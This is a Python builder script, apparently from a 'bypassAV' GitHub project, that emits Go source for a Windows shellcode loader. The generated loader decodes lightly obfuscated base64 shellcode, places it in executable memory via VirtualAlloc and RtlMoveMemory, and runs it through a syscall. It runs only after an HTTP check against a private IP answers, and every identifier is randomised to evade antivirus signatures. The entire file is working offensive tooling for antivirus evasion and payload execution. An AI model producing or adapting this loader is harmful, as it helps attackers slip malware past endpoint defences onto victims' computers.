import random

#author: pureqh
#github: https://github.com/pureqh/bypassAV
#use: python build.py

exp = '''package main

import (
    "encoding/base64"
    "strings"
    "syscall"
    "unsafe"
    "net/http"
    "net/url"
)
var (
    {2}  = syscall.NewLazyDLL("kernel32.dll")
    {3} = {2}.NewProc("VirtualAlloc")
    {4} = {2}.NewProc("RtlMoveMemory")
)

func {5}({6} string){0}
    {7} :=strings.Replace({6}, "#", "A", -1 )
    {8} :=strings.Replace({7}, "!", "H", -1 )
    {9} :=strings.Replace({8}, "@", "1", -1 )
    {10} :=strings.Replace({9}, ")", "T", -1 )
    {11},_ := base64.StdEncoding.DecodeString({10}) 
    {12}, _, _ := {3}.Call(0, uintptr(len({11})), 0x1000|0x2000, 0x40)
    _, _, _ = {4}.Call({12}, (uintptr)(unsafe.Pointer(&{11}[0])), uintptr(len({11})))
    syscall.Syscall({12}, 0, 0, 0, 0)

{1}
func main() {0}
    {14}, _ := url.Parse("http://192.168.150.131")
    {15} := {14}.Query()
    {14}.RawQuery = {15}.Encode()
    {16}, {18} := http.Get({14}.String())
    if {18} != nil {0}
        return
    {1}
    {13} := {16}.StatusCode
    {16}.Body.Close()
    if {18} != nil {0}
        return
    {1}
    var {17} int = 200
    if {13} == {17} {0}
    {5}("your base64shellcode")
    {1}
{1}'''


def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))  
   
def build_AV():

    lef = '''{'''
    rig = '''}'''
    var1 = random_name(random.randint(3,9))
    var2 = random_name(random.randint(3,9))
    var3 = random_name(random.randint(3,9))
    fun1 = random_name(random.randint(3,9))
    var4 = random_name(random.randint(3,9))
    var5 = random_name(random.randint(3,9))
    var6 = random_name(random.randint(3,9))
    var7 = random_name(random.randint(3,9))
    var8 = random_name(random.randint(3,9))
    var9 = random_name(random.randint(3,9))
    var10 = random_name(random.randint(3,9))
    var11 = random_name(random.randint(3,9))
    var12 = random_name(random.randint(3,9))
    var13 = random_name(random.randint(3,9))
    var14 = random_name(random.randint(3,9))
    var15 = random_name(random.randint(3,9))
    var16 = random_name(random.randint(3,9))


    shellc = exp.format(lef,rig,var1,var2,var3,fun1,var4,var5,var6,var7,var8,var9,var10,var11,var12,var13,var14,var15,var16)
    return shellc


if __name__ == '__main__':
    print (build_AV())
    print (random.randint(1,9))